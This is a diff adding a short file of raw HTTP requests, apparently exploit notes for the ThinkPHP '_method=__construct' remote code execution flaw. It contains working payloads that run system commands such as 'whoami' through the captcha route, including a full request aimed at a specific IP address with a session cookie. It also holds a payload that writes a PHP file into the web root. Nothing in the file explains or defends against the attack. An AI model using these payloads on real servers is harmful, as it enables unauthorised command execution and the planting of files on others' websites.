@@ -1,0 +1,24 @@
+POST /index.php?s=captcha HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+_method=__construct&filter[]=system&method=get&get[]=whoami
+_method=__construct&filter[]=system&method=get&get[]=whoami
+
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
+_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
+
+
+POST /index.php?s=captcha HTTP/1.1
+Host: 115.29.198.37
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Cookie: s7466e88d=nh3u59p84knb0968bsse2e4qr3
+Upgrade-Insecure-Requests: 1
+Content-Length: 59
+_method=__construct&filter[]=system&method=get&get[]=whoami
+
+_method=__construct&filter[]=system&method=get&get[]=cd ../../../../../var/www/html/static %26%26   file_put_contents(%271.php%27,%27<?php phpinfo();?>%27)
